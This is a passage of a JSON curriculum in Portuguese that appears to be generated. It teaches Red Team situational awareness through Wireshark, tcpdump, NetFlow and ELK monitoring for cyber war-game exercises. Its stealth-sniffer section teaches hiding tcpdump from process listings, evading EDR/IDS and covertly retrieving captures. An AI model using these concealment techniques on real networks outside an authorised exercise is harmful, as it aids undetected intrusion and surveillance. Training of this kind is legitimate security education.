                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Análises anteriores",
                                    "Ferramenta de apresentação (ex: PowerPoint, Google Slides)"
                                  ],
                                  "tips": [
                                    "Estruture como história: Problema → Awareness → Resolução.",
                                    "Inclua visuals para engajar o público."
                                  ],
                                  "learningObjective": "Sintetizar análises em exemplos acionáveis e comunicáveis.",
                                  "commonMistakes": [
                                    "Generalizar demais sem ancorar em casos específicos.",
                                    "Ignorar contra-argumentos potenciais."
                                  ]
                                }
                              ],
                              "practicalExample": "No livro 'Red Team Development and Operations', um caso descreve uma simulação onde o Red Team falhou ao invadir uma rede corporativa porque não monitorou logs de firewall em tempo real (baixa consciência situacional), resultando em detecção precoce e neutralização. Com awareness plena, teriam pivotado para vetores alternativos, prolongando a operação por dias.",
                              "finalVerifications": [
                                "Pode recitar pelo menos 3 casos do livro com detalhes de awareness.",
                                "Explica causalmente o impacto da consciência situacional em sucessos/falhas.",
                                "Apresenta ilustrações visuais ou narrativas claras para um público leigo.",
                                "Identifica lições aplicáveis a operações cibernéticas modernas.",
                                "Demonstra compreensão evitando confusão com outros conceitos como ROE.",
                                "Liga exemplos a métricas reais de operações (ex: tempo de dwell)."
                              ],
                              "assessmentCriteria": [
                                "Profundidade: Análise ancorada em evidências textuais (80%+ cobertura).",
                                "Clareza: Ilustrações concisas e visuais eficazes.",
                                "Precisão: Sem distorções dos casos originais do livro.",
                                "Originalidade: Insights únicos sobre impacto da awareness.",
                                "Completude: Todos elementos (causas, efeitos, lições) abordados.",
                                "Comunicabilidade: Explicação acessível em 5-10 minutos."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Fatores humanos em tomada de decisão sob pressão.",
                                "História Militar: Origens do Red Teaming na doutrina de wargames.",
                                "Gestão de Projetos: Monitoramento de riscos em tempo real.",
                                "Inteligência Artificial: Uso de ferramentas de awareness automatizada."
                              ],
                              "realWorldApplication": "Em operações de Red Team para empresas como Google ou governos, alta consciência situacional permite simular ataques persistentes (APT), identificando vulnerabilidades antes de exploits reais, reduzindo riscos em breaches como o SolarWinds."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "2.0.2.3.1.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.2",
                    "name": "Técnicas de Monitoramento para Consciência Situacional",
                    "description": "Métodos e ferramentas para manter a awareness situacional durante jogos de guerra cibernética.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.2.1",
                        "name": "Monitoramento de Rede para Consciência Situacional",
                        "description": "Técnicas para observar o tráfego de rede em tempo real durante operações de Red Team, identificando respostas do Blue Team e mudanças no ambiente.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.1.1",
                            "name": "Uso de Wireshark para Captura de Pacotes",
                            "description": "Configurar e utilizar o Wireshark para capturar e analisar pacotes de rede, filtrando tráfego suspeito e detectando tentativas de detecção durante jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial do Wireshark",
                                  "subSteps": [
                                    "Baixe a versão mais recente do Wireshark do site oficial (wireshark.org).",
                                    "Instale o Wireshark selecionando as interfaces de rede disponíveis durante a instalação.",
                                    "Instale os componentes adicionais como Npcap ou WinPcap para captura de pacotes.",
                                    "Configure permissões administrativas e selecione interfaces de rede para monitoramento.",
                                    "Inicie o Wireshark e verifique a lista de interfaces disponíveis."
                                  ],
                                  "verification": "O Wireshark abre sem erros e lista as interfaces de rede ativas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Computador com Windows/Linux/macOS",
                                    "Acesso à internet",
                                    "Privilégios de administrador"
                                  ],
                                  "tips": "Sempre execute como administrador para evitar problemas de permissão em capturas.",
                                  "learningObjective": "Instalar e configurar o Wireshark corretamente para capturas iniciais.",
                                  "commonMistakes": [
                                    "Não instalar Npcap/WinPcap",
                                    "Esquecer de selecionar interfaces",
                                    "Executar sem privilégios admin"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Captura de Pacotes Básica",
                                  "subSteps": [
                                    "Selecione uma interface de rede ativa (ex: Wi-Fi ou Ethernet).",
                                    "Inicie a captura clicando em 'Start' e gere tráfego de rede (ex: abra sites).",
                                    "Pare a captura após 1-2 minutos e salve o arquivo .pcap.",
                                    "Navegue pela lista de pacotes visualizando colunas como No., Time, Source, Destination.",
                                    "Exporte uma amostra de pacotes para análise posterior."
                                  ],
                                  "verification": "Pacotes são capturados e exibidos com detalhes de origem/destino/protocolo.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Conexão de rede ativa"
                                  ],
                                  "tips": "Use 'Capture Filters' para limitar tráfego e evitar sobrecarga de dados.",
                                  "learningObjective": "Realizar capturas básicas de tráfego de rede em tempo real.",
                                  "commonMistakes": [
                                    "Capturar em interface errada",
                                    "Não pausar captura a tempo",
                                    "Ignorar filtros iniciais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicação de Filtros para Tráfego Específico",
                                  "subSteps": [
                                    "Aprenda sintaxe de display filters (ex: 'http' para HTTP, 'ip.src == 192.168.1.1').",
                                    "Aplique filtro durante captura ou pós-captura na barra de filtros.",
                                    "Crie filtros compostos (ex: 'tcp.port == 80 or tcp.port == 443').",
                                    "Salve filtros personalizados para reutilização.",
                                    "Teste filtros em uma captura existente para isolar tráfego suspeito."
                                  ],
                                  "verification": "Apenas pacotes filtrados são exibidos, sem falsos positivos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivo .pcap de teste",
                                    "Documentação de filtros Wireshark"
                                  ],
                                  "tips": "Use 'expression' button para autocompletar filtros complexos.",
                                  "learningObjective": "Dominar filtros para isolar tráfego relevante eficientemente.",
                                  "commonMistakes": [
                                    "Erros de sintaxe em filtros",
                                    "Confundir capture vs display filters",
                                    "Filtros muito amplos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Análise Detalhada de Pacotes Capturados",
                                  "subSteps": [
                                    "Selecione um pacote e expanda camadas (Ethernet > IP > TCP > Payload).",
                                    "Inspecione campos como flags TCP, payloads e anomalias (ex: scans de porta).",
                                    "Use 'Follow > TCP Stream' para reconstruir sessões.",
                                    "Analise estatísticas via 'Statistics > Conversations' e 'Endpoints'.",
                                    "Identifique padrões suspeitos como SYN floods ou dados criptografados incomuns."
                                  ],
                                  "verification": "Relatório de análise identifica pelo menos 3 anomalias em tráfego simulado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Capturas .pcap com tráfego simulado"
                                  ],
                                  "tips": "Ative coloração por protocolo para visualização rápida de anomalias.",
                                  "learningObjective": "Analisar estruturas de pacotes para detectar comportamentos maliciosos.",
                                  "commonMistakes": [
                                    "Não expandir todas as camadas",
                                    "Ignorar timestamps",
                                    "Confundir tráfego normal com suspeito"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Detecção de Tráfego Suspeito em Jogos de Guerra Cibernética",
                                  "subSteps": [
                                    "Simule um cenário de ataque (ex: use nmap para scan em rede local).",
                                    "Capture e filtre por tráfego de reconnaissance (ex: ICMP, múltiplos SYN).",
                                    "Detecte tentativas de evasão (ex: fragmentação, TTL baixo).",
                                    "Gere alertas manuais e exporte evidências para regras de engajamento.",
                                    "Integre com ferramentas como ELK para logging em cenários avançados."
                                  ],
                                  "verification": "Identifica e documenta 5+ indicadores de tráfego suspeito em simulação.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramentas de simulação (nmap, hping3)",
                                    "Ambiente de lab isolado"
                                  ],
                                  "tips": "Em jogos de guerra, priorize filtros em tempo real para consciência situacional.",
                                  "learningObjective": "Aplicar Wireshark em cenários de ciberdefesa para detecção em tempo real.",
                                  "commonMistakes": [
                                    "Expor lab à rede real",
                                    "Não documentar chain of custody",
                                    "Sobrecarregar com dados irrelevantes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulado, configure Wireshark em uma interface monitorando tráfego de uma VM atacante executando um scan Nmap. Aplique filtro 'tcp.flags.syn==1 and tcp.flags.ack==0' para detectar SYN scans, analise 50 pacotes para confirmar reconnaissance e exporte o .pcap como evidência para o time de defesa.",
                              "finalVerifications": [
                                "Wireshark captura pacotes de múltiplas interfaces sem perda.",
                                "Filtros isolam tráfego suspeito com 100% de precisão em testes.",
                                "Análise identifica payloads maliciosos e sessões reconstruídas.",
                                "Estatísticas de conversas mostram anomalias claras.",
                                "Relatório exportado inclui timestamps e evidências chain-of-custody.",
                                "Integração com cenários de guerra cibernética é demonstrada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração e captura (sem erros de permissão).",
                                "Eficiência de filtros (redução >90% de ruído).",
                                "Profundidade de análise (camadas expandidas e streams seguidos).",
                                "Detecção de 80%+ de tráfego suspeito em simulações.",
                                "Documentação clara de verificações e evidências.",
                                "Tempo de execução dentro dos estimados."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entendimento profundo de protocolos TCP/IP.",
                                "Programação: Criação de scripts Tshark para automação de análises.",
                                "Análise de Dados: Uso de estatísticas Wireshark como Big Data.",
                                "Ética e Direito Cibernético: Regras de engajamento e privacidade em capturas.",
                                "Inteligência Artificial: Integração com ML para detecção automatizada de anomalias."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), analistas usam Wireshark para investigar incidentes de intrusão, filtrando tráfego C2 de malware durante ataques reais, fornecendo evidências forenses para equipes de resposta a incidentes e prevenindo brechas em infraestruturas críticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.2",
                            "name": "Implementação de Sniffers Passivos",
                            "description": "Deploy de sniffers como Tcpdump em modo stealth para monitoramento contínuo de rede sem alertar defesas, mantendo awareness de movimentações adversárias.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparação do Ambiente de Monitoramento",
                                  "subSteps": [
                                    "Identifique a interface de rede alvo usando comandos como 'ip link show' ou 'ifconfig'.",
                                    "Verifique permissões root ou capabilities para captura de pacotes (ex: sudo ou setcap).",
                                    "Configure uma VM ou máquina isolada para testes, simulando rede com tráfego controlado (ex: Wireshark em outra VM para gerar tráfego).",
                                    "Desative detecções de IDS/IPS na rede de teste para validar stealth.",
                                    "Documente o baseline de tráfego normal para comparação futura."
                                  ],
                                  "verification": "Confirme que a interface está ativa e permissões concedidas sem erros via 'tcpdump -D'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Máquina Linux (Ubuntu/Debian), acesso root, VM com rede bridged/host-only, ferramentas como ifconfig/iproute2.",
                                  "tips": "Use uma sub-rede isolada para evitar impacto em produção.",
                                  "learningObjective": "Entender e preparar infraestrutura para captura passiva sem comprometer stealth.",
                                  "commonMistakes": "Esquecer permissões root, levando a falhas de captura; expor a máquina de monitoramento na rede principal."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalação e Configuração Inicial do Tcpdump",
                                  "subSteps": [
                                    "Instale Tcpdump via apt/yum: 'sudo apt install tcpdump'.",
                                    "Teste captura básica: 'sudo tcpdump -i <interface> -c 10'.",
                                    "Configure modo promiscuous se necessário: 'sudo ifconfig <interface> promisc'.",
                                    "Habilite captura em background com rotação de arquivos: estude opções -G, -C, -W.",
                                    "Defina usuário não-root com capabilities: 'sudo setcap cap_net_raw,cap_net_admin=eip tcpdump'."
                                  ],
                                  "verification": "Capture 10 pacotes sem erros e visualize com 'tcpdump -r arquivo.pcap'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Tcpdump instalado, editor de texto para scripts, interface de rede física/virtual.",
                                  "tips": "Sempre teste em ambiente controlado antes de produção.",
                                  "learningObjective": "Dominar instalação e execução básica de Tcpdump para operação stealth.",
                                  "commonMistakes": "Executar sem root sem capabilities, causando 'permission denied'; não testar modo promiscuous."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementação de Modo Stealth e Captura Silenciosa",
                                  "subSteps": [
                                    "Configure Tcpdump para não imprimir na tela: use -w para salvar em arquivo pcap.",
                                    "Implemente filtros BPF para capturar apenas tráfego relevante: ex: 'tcpdump -i eth0 host 192.168.1.100'.",
                                    "Execute em daemon mode: 'nohup tcpdump -i eth0 -w /var/log/sniff.pcap &'.",
                                    "Mascare processos com chroot ou namespaces para evitar detecção por PS/Proc.",
                                    "Configure logs rotativos para evitar overflow de disco: '-C 100 -W 10 -G 3600'."
                                  ],
                                  "verification": "Verifique que Tcpdump roda em background (ps aux | grep tcpdump) sem output visível e gera arquivos pcap.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Tcpdump, nohup, chroot ou systemd-nspawn, espaço em disco para pcaps.",
                                  "tips": "Use BPF filters precisos para reduzir footprint e ruído.",
                                  "learningObjective": "Configurar Tcpdump para operação invisível, evitando detecção por EDR/IDS.",
                                  "commonMistakes": "Deixar output na tela ou não mascarar processo, alertando monitoramento comportamental."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitoramento Contínuo e Análise Inicial",
                                  "subSteps": [
                                    "Monitore remotamente via scp/rsyslog para extrair pcaps sem login direto.",
                                    "Analise pcaps offline com tshark/Wireshark: 'tshark -r sniff.pcap -Y \"http\"'.",
                                    "Defina alertas customizados via scripts Python para anomalias (ex: tráfego C2 suspeito).",
                                    "Valide stealth: cheque logs de IDS e confirme ausência de alertas de scan/sniffing.",
                                    "Automatize restart e rotação com cron: '@hourly killall tcpdump; start_sniffer.sh'."
                                  ],
                                  "verification": "Analise pcap capturado mostrando tráfego adversário sem alertas gerados.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Tshark/Wireshark, Python para scripts, cron, acesso SSH/SCP.",
                                  "tips": "Integre com ELK stack para análise escalável se possível.",
                                  "learningObjective": "Estabelecer monitoramento passivo sustentável com análise acionável.",
                                  "commonMistakes": "Não rotacionar arquivos, causando perda de dados; análise online gerando tráfego detectável."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validação e Otimização para Consciência Situacional",
                                  "subSteps": [
                                    "Simule ataque em rede de teste e confirme captura sem detecção.",
                                    "Otimize filters para ROEs (Regras de Engajamento): ex: apenas portas específicas.",
                                    "Integre com SIEM para correlação passiva.",
                                    "Teste resiliência: mate processo e confirme auto-restart.",
                                    "Documente SOPs para deployment em cenários reais."
                                  ],
                                  "verification": "Relatório mostrando captura de simulação de adversário com zero alertas.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ambiente de simulação (Metasploit para tráfego adversário), SIEM opcional.",
                                  "tips": "Sempre valide contra defesas reais como Suricata/Snort.",
                                  "learningObjective": "Otimizar sniffer para awareness contínua em jogos de guerra cibernética.",
                                  "commonMistakes": "Filters muito amplos gerando ruído excessivo; ignorar ROEs levando a falsos positivos."
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team vs Blue Team, deploy um Tcpdump stealth em uma VM bastion na rede DMZ para capturar tráfego C2 de um Cobalt Strike beacon sem acionar o EDR da Blue Team, salvando pcaps para análise posterior e confirmando movimentações adversárias.",
                              "finalVerifications": [
                                "Tcpdump captura tráfego específico sem gerar alertas em IDS/EDR.",
                                "Arquivos pcap são gerados e rotacionados corretamente sem overflow.",
                                "Processo roda em stealth (invisível em ps/top sem grep específico).",
                                "Análise revela movimentações adversárias alinhadas com ROEs.",
                                "Sistema auto-reinicia após interrupção sem intervenção manual.",
                                "Nenhum tráfego de saída detectável do sniffer."
                              ],
                              "assessmentCriteria": [
                                "Proficiência em BPF filters: 90% de precisão na captura seletiva.",
                                "Tempo de setup < 2 horas com zero detecções em simulação.",
                                "Análise de pcap identifica 5+ IOCs de tráfego adversário.",
                                "Uptime de monitoramento > 95% em teste de 24h.",
                                "Documentação completa de SOPs e troubleshooting.",
                                "Validação cross-plataforma (Linux/Windows com npcap)."
                              ],
                              "crossCurricularConnections": [
                                "Redes (SC-03): Entendimento profundo de protocolos e interfaces.",
                                "Análise de Malware (SC-05): Identificação de C2 em pcaps.",
                                "Defesa Ativa (SC-07): Integração com honeypots e canaries.",
                                "Programação em Python (GEN-02): Scripts para automação de análise.",
                                "Ética e ROEs (SC-01): Aplicação de regras em monitoramento."
                              ],
                              "realWorldApplication": "Em operações de Cyber Threat Hunting ou CTF em empresas como Mandiant/FireEye, sniffers passivos como Tcpdump são usados em bastions para monitorar APTs sem escalada de privilégios, mantendo awareness em incident response sem alertar atacantes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.3",
                            "name": "Análise de Fluxos de Rede com NetFlow",
                            "description": "Configurar coleta de NetFlow para mapear fluxos de dados, identificando anomalias e pivôs potenciais em cenários de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de NetFlow",
                                  "subSteps": [
                                    "Estude a estrutura de registros NetFlow (versões 5, 9 e IPFIX).",
                                    "Identifique campos chave: source/destination IP, ports, bytes/packets, AS numbers.",
                                    "Diferencie fluxos de tráfego: uni vs bidirecional e timeouts.",
                                    "Revise casos de uso em segurança: detecção de scans, DDoS e exfiltração.",
                                    "Instale ferramentas básicas como nfdump ou nfsen para familiarização."
                                  ],
                                  "verification": "Resuma em um diagrama os componentes de um registro NetFlow e explique 3 casos de uso em segurança.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação Cisco NetFlow",
                                    "Tutorial nfdump",
                                    "Ambiente virtual GNS3 ou EVE-NG"
                                  ],
                                  "tips": "Use diagramas visuais para mapear fluxos; foque em v9 para flexibilidade.",
                                  "learningObjective": "Dominar terminologia e estrutura de NetFlow para configuração eficaz.",
                                  "commonMistakes": [
                                    "Confundir NetFlow com SNMP",
                                    "Ignorar diferenças entre versões",
                                    "Subestimar impacto de sampling"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Exportador NetFlow em Dispositivo de Rede",
                                  "subSteps": [
                                    "Acesse o roteador via CLI (ex: Cisco IOS).",
                                    "Habilite NetFlow globalmente: 'ip flow-export version 9'.",
                                    "Configure interface de entrada/saída: 'ip flow ingress' e 'ip flow egress'.",
                                    "Defina coletor: 'ip flow-export destination IP_COLLECTOR 9996'.",
                                    "Aplique ACL para filtrar tráfego relevante e teste com 'show ip cache flow'."
                                  ],
                                  "verification": "Execute 'show ip flow export' e confirme exportação ativa sem erros.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Roteador virtual Cisco IOS (GNS3)",
                                    "PC com acesso SSH/Telnet"
                                  ],
                                  "tips": "Use UDP porta 9996 padrão; ative logging para debug.",
                                  "learningObjective": "Configurar dispositivo para exportar fluxos NetFlow de forma segura e eficiente.",
                                  "commonMistakes": [
                                    "Esquecer ACLs levando a overload",
                                    "Porta errada bloqueada por firewall",
                                    "Não configurar bidirectional flows"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar e Configurar Coletor NetFlow",
                                  "subSteps": [
                                    "Instale software coletor (ex: nfcapd do nfdump em Linux).",
                                    "Configure listener: edite nfcapd.conf com porta 9996 e rotação de arquivos.",
                                    "Inicie serviço: 'nfcapd -p 9996 -l /var/netflow'.",
                                    "Integre com visualizador como nfsen ou ELK Stack.",
                                    "Teste recebimento gerando tráfego com ping/traffic generator."
                                  ],
                                  "verification": "Verifique logs do coletor mostrando fluxos recebidos e arquivos .nfcap gerados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VM Ubuntu/Debian",
                                    "Pacotes nfdump/nfsen",
                                    "Ferramenta de geração de tráfego como hping3"
                                  ],
                                  "tips": "Use Docker para setup rápido; configure retenção de dados por 7 dias.",
                                  "learningObjective": "Estabelecer um coletor robusto para captura contínua de fluxos.",
                                  "commonMistakes": [
                                    "Firewall bloqueando porta UDP",
                                    "Diretórios sem permissões",
                                    "Sobrecarga de disco sem rotação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Fluxos e Identificar Anomalias",
                                  "subSteps": [
                                    "Use nfdump para queries: 'nfdump -R /var/netflow -s bytes htop10'.",
                                    "Filtre por IP/porta suspeita: 'nfdump -n src ip 192.168.1.100'.",
                                    "Detecte anomalias: alto volume, ports incomuns, AS desconhecidos.",
                                    "Visualize em nfsen: gráficos de top talkers e fluxos longos.",
                                    "Correlacione com eventos de segurança (ex: logs firewall)."
                                  ],
                                  "verification": "Gere relatório listando 3 anomalias simuladas com evidências de fluxos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "nfdump/nfsen instalados",
                                    "Scripts de simulação de ataques (ex: scan Nmap)"
                                  ],
                                  "tips": "Automatize com scripts awk; baseline tráfego normal primeiro.",
                                  "learningObjective": "Extrair insights de fluxos para detecção de ameaças.",
                                  "commonMistakes": [
                                    "Queries sem filtros desperdiçando tempo",
                                    "Ignorar direção do fluxo",
                                    "Falso positivo sem baseline"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar em Cenários de Jogos Cibernéticos",
                                  "subSteps": [
                                    "Simule pivô em lab CTF: atacante escaneia e pivota via RDP/SSH.",
                                    "Monitore com NetFlow: identifique fluxos anômalos de pivô.",
                                    "Mapeie cadeia de ataque: source -> victim -> pivot.",
                                    "Defina regras de detecção: fluxos >1GB ou duração >1h.",
                                    "Documente pivôs potenciais para regras de engajamento."
                                  ],
                                  "verification": "Em cenário simulado, identifique e documente 2 pivôs com capturas NetFlow.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Lab CTF com VulnHub/Metasploitable",
                                    "Ferramentas ataque: Metasploit/Nmap"
                                  ],
                                  "tips": "Combine com Zeek/Suricata para contexto; pratique em TryHackMe rooms.",
                                  "learningObjective": "Integrar NetFlow em operações cibernéticas para consciência situacional.",
                                  "commonMistakes": [
                                    "Foco só em volume, ignorar latência",
                                    "Não simular tráfego realista",
                                    "Confundir ruído com pivô"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab GNS3 com roteador Cisco conectado a VMs attacker/victim/pivot, configure NetFlow para detectar um scan Nmap seguido de exploit RDP no victim, revelando pivô via SSH para outro host interno. Analise fluxos mostrando alto SYN packets e conexão persistente SSH.",
                              "finalVerifications": [
                                "Fluxos NetFlow são coletados e visualizados corretamente em nfsen.",
                                "Anomalias simuladas (ex: DDoS, scan) são detectadas em <5 min.",
                                "Relatório identifica pivôs com evidências de fluxos (IPs, ports, bytes).",
                                "Baseline de tráfego normal é estabelecido sem falsos positivos.",
                                "Configuração persiste após reboot de dispositivos.",
                                "Integração com ferramentas SIEM (ex: ELK) funciona."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração: zero erros em 'show' commands.",
                                "Eficiência de análise: tempo <10s para queries top talkers.",
                                "Qualidade de detecção: 90% acerto em anomalias simuladas.",
                                "Documentação: diagramas e relatórios claros.",
                                "Escalabilidade: suporta 10k fluxos/seg sem perda.",
                                "Segurança: exportação restrita por ACL."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos de roteamento e sampling (BGP/OSPF).",
                                "Forense Digital: Correlação com PCAPs Wireshark.",
                                "Inteligência de Ameaças: Mapeamento MITRE ATT&CK T1046.",
                                "Análise de Dados: Queries SQL-like com nfdump.",
                                "Automação: Scripts Python para parsing NetFlow."
                              ],
                              "realWorldApplication": "Em um SOC de empresa, NetFlow monitora borda de rede para detectar exfiltração de dados durante breach, identificando pivôs internos em APTs, permitindo resposta rápida sob regras de engajamento em exercícios Red Team/Blue Team."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.2",
                        "name": "Monitoramento de Logs e Eventos",
                        "description": "Métodos para rastrear logs de sistemas e eventos de segurança, permitindo ao Red Team antecipar detecções e ajustar táticas em tempo real.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.2.1",
                            "name": "Coleta e Análise de Logs com ELK Stack",
                            "description": "Integrar Elasticsearch, Logstash e Kibana para centralizar e visualizar logs de hosts comprometidos, detectando hunting activities do Blue Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial do Elasticsearch",
                                  "subSteps": [
                                    "Baixe e instale o Elasticsearch usando o gerenciador de pacotes apt no Ubuntu (adicione o repositório oficial Elastic).",
                                    "Configure o elasticsearch.yml para definir cluster.name, node.name e network.host: 0.0.0.0.",
                                    "Inicie o serviço com systemctl start elasticsearch e habilite com systemctl enable elasticsearch.",
                                    "Verifique o status da saúde do cluster via curl localhost:9200/_cluster/health.",
                                    "Crie um índice inicial para logs de segurança com mapeamento básico para campos como timestamp, host, event_type."
                                  ],
                                  "verification": "Execute curl localhost:9200 e confirme status 'green'; teste criação de índice com curl -X PUT localhost:9200/logs-security.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Máquina virtual Ubuntu 20.04 LTS",
                                    "Acesso root/sudo",
                                    "Internet para download Elastic",
                                    "curl instalado"
                                  ],
                                  "tips": "Use firewall ufw allow 9200 para testes locais; monitore logs em /var/log/elasticsearch para erros de JVM heap.",
                                  "learningObjective": "Entender e configurar o storage distribuído para logs escalável.",
                                  "commonMistakes": [
                                    "Não configurar network.host levando a bind apenas em localhost",
                                    "Ignorar alocação de memória JVM (defina -Xms2g -Xmx2g)",
                                    "Esquecer de abrir porta 9200"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configuração do Logstash para Coleta de Logs",
                                  "subSteps": [
                                    "Instale Logstash via apt do repositório Elastic.",
                                    "Crie um pipeline de configuração (logstash.conf) com input beats ou file para simular logs de /var/log/syslog e /var/log/auth.log.",
                                    "Defina filter com grok patterns para parse de logs de segurança (ex: %{SYSLOGTIMESTAMP:timestamp} %{HOSTNAME:host}).",
                                    "Configure output para Elasticsearch com hosts => [\"localhost:9200\"] e index => \"logs-security-%{+YYYY.MM.dd}\".",
                                    "Teste o pipeline com /usr/share/logstash/bin/logstash -f logstash.conf --config.test_and_exit."
                                  ],
                                  "verification": "Inicie Logstash e verifique logs sendo enviados via curl localhost:9200/_cat/indices para novo índice criado.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Logstash instalado",
                                    "Editor de texto como vim/nano",
                                    "Logs de teste gerados com logger comando"
                                  ],
                                  "tips": "Use codec => multiline para logs multi-linha; teste grok com debugger online antes.",
                                  "learningObjective": "Dominar pipeline ETL para normalização de logs heterogêneos.",
                                  "commonMistakes": [
                                    "Grok patterns incorretos causando _grokparsefailure",
                                    "Output sem SSL levando a falhas em prod",
                                    "Não definir pipeline workers para performance"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalação e Integração do Kibana",
                                  "subSteps": [
                                    "Instale Kibana via apt e configure kibana.yml com server.host: \"0.0.0.0\" e elasticsearch.hosts: [\"http://localhost:9200\"].",
                                    "Inicie Kibana com systemctl start kibana.",
                                    "Acesse http://localhost:5601, crie index pattern para logs-security-* com timestamp como @timestamp.",
                                    "Configure Discover para visualizar logs recentes e crie uma visualização básica de contagem por host.",
                                    "Salve um dashboard inicial com filtros para eventos de autenticação falhada."
                                  ],
                                  "verification": "Navegue no Kibana Discover e confirme visualização de logs ingeridos; dashboard salva acessível.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Kibana instalado",
                                    "Porta 5601 aberta no firewall"
                                  ],
                                  "tips": "Use Ctrl+Shift+L para console dev; index pattern deve matching exato para time-based indices.",
                                  "learningObjective": "Visualizar e interagir com dados indexados para análise rápida.",
                                  "commonMistakes": [
                                    "elasticsearch.hosts mal configurado causando conexão falha",
                                    "Index pattern sem timestamp field",
                                    "Dashboard sem refresh interval"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Análise de Logs para Detecção de Hunting Activities",
                                  "subSteps": [
                                    "Gere logs simulados de host comprometido (ex: falhas de login, conexões outbound suspeitas via logger ou scripts).",
                                    "Crie queries KQL no Discover para detectar padrões: event_type:\"ssh\" AND result:\"fail\" OR dest_ip:\"suspicious.com\".",
                                    "Construa visualizações: pie chart de top hosts por eventos, line chart de falhas ao longo do tempo, heatmap de IPs.",
                                    "Configure alertas com Watcher ou Kibana Alerts para thresholds (ex: >10 falhas/min).",
                                    "Salve dashboard de Threat Hunting com filtros para Blue Team activities."
                                  ],
                                  "verification": "Execute query e visualize detecções; teste alerta disparando logs simulados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Scripts de simulação de ataques (ex: bash para gerar logs)",
                                    "KQL cheat sheet"
                                  ],
                                  "tips": "Use Lens para visualizações rápidas; agregue com terms agg em host para top talkers.",
                                  "learningObjective": "Aplicar análise forense em logs para identificar IOCs de comprometimento.",
                                  "commonMistakes": [
                                    "Queries case-sensitive sem wildcards",
                                    "Filtros muito amplos gerando ruído",
                                    "Alertas sem ações como email/slack"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimização e Testes Finais da Stack ELK",
                                  "subSteps": [
                                    "Monitore performance com _cat/indices e _nodes/stats; ajuste shards/replicas.",
                                    "Implemente autenticação básica com xpack.security.enabled: true e gere certificados.",
                                    "Teste failover simulando downtime de node e verificando recuperação.",
                                    "Exporte dashboard como NDJSON para versionamento.",
                                    "Documente pipeline completo em README com diagramas (use draw.io)."
                                  ],
                                  "verification": "Stack resiliente a restarts; dashboards exportados e segurança básica ativa.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
